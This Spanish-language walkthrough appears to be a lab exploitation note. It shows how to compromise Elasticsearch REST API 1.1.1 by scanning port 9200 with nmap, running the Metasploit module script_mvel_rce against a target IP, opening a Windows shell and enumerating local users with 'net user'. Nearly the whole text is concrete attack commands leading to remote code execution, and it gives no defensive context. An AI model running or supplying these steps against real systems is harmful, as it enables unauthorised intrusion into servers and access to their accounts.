# Explotación de servicio Elasticsearch REST API 1.1.1 
Escanear la IP objetivo para conocer los puertos abiertos para ejecutar servicios

nmap -p 9200 -sV 172.16.3.122 

<img src="exploits_img/elasticsearch1.png" alt="nmap Elasticsearch" width="500" height="170">

Procedemos a explotar la vulnerabilidad con Metasploit de la siguiente forma:

use exploit/multi/elasticsearch/script_mvel_rce
set RHOSTS 172.16.3.122
exploit

Al explotar la vulnerabilidad podremos verificar lo siguiente:

<img src="exploits_img/elasticsearch2.png" alt="ejecucion exploit" width="500" height="450">

Luego podremos solicitar una consola de comandos de Windows con el comando “shell” y 
posteriormente listar los usuarios locales de la siguiente forma: "net user"

<img src="exploits_img/elasticsearch3.png" alt="resultado" width="500" height="350">
